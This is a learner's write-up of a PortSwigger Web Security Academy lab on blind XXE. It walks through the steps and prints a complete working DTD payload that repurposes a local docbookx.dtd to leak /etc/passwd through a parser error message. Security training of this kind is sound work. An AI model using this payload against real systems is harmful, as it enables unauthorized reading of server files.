# Exploiting XXE to Retrieve Data by Repurposing a Local DTD

- **Platform:** PortSwigger Web Security Academy
- **Difficulty:** Expert
- **Category:** XML External Entity (XXE) / Blind XXE
- **Lab:** [Exploiting XXE to retrieve data by repurposing a local DTD](https://portswigger.net/web-security/xxe/blind/lab-xxe-trigger-error-message-by-repurposing-local-dtd)
- **Status:** Solved

## Objective

The goal was to use a blind XXE vulnerability and a local DTD file to make the XML parser reveal the contents of a file through an error message.

## Tools

- Burp Suite Community Edition
- Web browser
- PortSwigger lab environment

## Steps I Followed

1. I opened a product page and clicked **Check stock**.
2. I intercepted the POST request in Burp Suite. Its body contained XML data, so I sent the request to Repeater.
3. I first added a simple DTD declaration and entity to test whether the XML parser processed DTD entities.
4. The first test produced an invalid product ID response, so I moved on to the local-DTD technique.
5. I referenced the local DTD file at `/usr/share/yelp/dtd/docbookx.dtd` and redefined an entity from it.
6. I created an external entity to read `/etc/passwd` and used a deliberately invalid file path to cause a parser error.
7. The error response included the contents of `/etc/passwd`. The lab then showed as solved.

## Key Payload

The following was the DTD payload used in the lab. It is included for learning and documentation purposes:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
  <!ENTITY % ISOamso '
    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
    &#x25;eval;
    &#x25;error;
  '>
  %local_dtd;
]>
<stockCheck>
  <productId>1</productId>
  <storeId>1</storeId>
</stockCheck>
```

## Result

The server returned a file-not-found parser error containing the contents of `/etc/passwd`. This demonstrated that the XML parser processed the external entity and disclosed file data through the error message.

## What I Learned

I learned how blind XXE can be used to retrieve data when the application does not directly show the parsed XML result. I also learned how a local DTD can be repurposed to trigger an error that contains the requested file contents.

## Evidence

Add a screenshot showing the lab's **Solved** status. Do not upload raw responses containing unnecessary server data, session cookies, or other sensitive information.
